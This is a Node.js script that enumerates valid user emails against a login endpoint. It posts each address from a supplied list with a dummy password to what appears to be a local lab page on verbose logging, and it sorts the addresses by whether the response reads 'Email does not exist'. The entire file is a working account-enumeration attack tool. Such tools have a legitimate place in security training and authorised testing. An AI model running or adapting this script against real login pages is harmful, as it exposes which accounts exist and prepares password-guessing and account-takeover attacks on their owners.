const axios = require('axios');
const fs = require('fs');
const path = require('path');

async function checkEmail(email) {
    const url = 'http://localhost:8080/security/verbose-logging/login.php';
    const headers = {
        'Host': 'localhost:8080',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://localhost',
        'Connection': 'close',
    };

    const data = new URLSearchParams({
        'username': email,
        'password': 'password',
        'function': 'login'
    });

    try {
        const response = await axios.post(url, data, { headers });
        return response.data;
    } catch (error) {
        console.error(`Error checking email ${email}:`, error.message);
        return null;
    }
}

async function enumerateEmails(emailFile) {
    const validEmails = [];
    const invalidError = "Email does not exist"; // Error message for invalid emails

    try {
        // Read the email file
        const fileContent = fs.readFileSync(emailFile, 'utf8');
        const emails = fileContent.split('\n').map(email => email.trim()).filter(email => email);

        console.log(`Found ${emails.length} emails to check...\n`);

        // Check each email
        for (const email of emails) {
            const responseJson = await checkEmail(email);
            
            if (responseJson) {
                if (responseJson.status === 'error' && responseJson.message.includes(invalidError)) {
                    console.log(`[INVALID] ${email}`);
                } else {
                    console.log(`[VALID] ${email}`);
                    validEmails.push(email);
                }
            }
            
            // Add a small delay to avoid overwhelming the server
            await new Promise(resolve => setTimeout(resolve, 100));
        }

        return validEmails;
    } catch (error) {
        console.error(`Error reading file ${emailFile}:`, error.message);
        process.exit(1);
    }
}

async function main() {
    // Check command line arguments
    if (process.argv.length !== 3) {
        console.log("Usage: node script.js <email_list_file>");
        process.exit(1);
    }

    const emailFile = process.argv[2];

    // Check if file exists
    if (!fs.existsSync(emailFile)) {
        console.error(`Error: File '${emailFile}' not found.`);
        process.exit(1);
    }

    console.log(`Starting email enumeration with file: ${emailFile}\n`);

    const validEmails = await enumerateEmails(emailFile);

    console.log("\n" + "=".repeat(40));
    console.log("Valid emails found:");
    console.log("=".repeat(40));
    
    if (validEmails.length > 0) {
        validEmails.forEach(email => console.log(email));
        console.log(`\nTotal valid emails: ${validEmails.length}`);
    } else {
        console.log("No valid emails found.");
    }
}

// Run the script
main().catch(error => {
    console.error('Script error:', error.message);
    process.exit(1);
});